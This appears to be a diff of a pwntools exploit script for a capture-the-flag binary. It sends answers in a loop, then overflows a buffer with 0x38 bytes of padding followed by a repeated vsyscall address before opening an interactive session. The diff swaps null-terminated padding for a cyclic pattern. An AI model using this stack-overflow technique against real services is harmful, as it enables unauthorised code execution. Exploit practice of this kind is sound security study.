@@ -43,7 +43,7 @@ if __name__ == "__main__":
 
     for i in xrange(999):
         success(i + 1)
-        io.sendlineafter(":", answer() + '\0')
+        io.sendlineafter(":", answer())
 
     '''
     0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
@@ -53,7 +53,7 @@ if __name__ == "__main__":
     vsyscall = 0xffffffffff600000
     #  vsyscall = 0xffffffffff600400
     #  vsyscall = 0xffffffffff600800
-    payload = (answer() + '\0').ljust(0x38, '\0') + p64(vsyscall) * 3
+    payload = cyclic(0x38) + p64(vsyscall) * 3
     io.sendafter(":", payload)
 
     io.interactive()
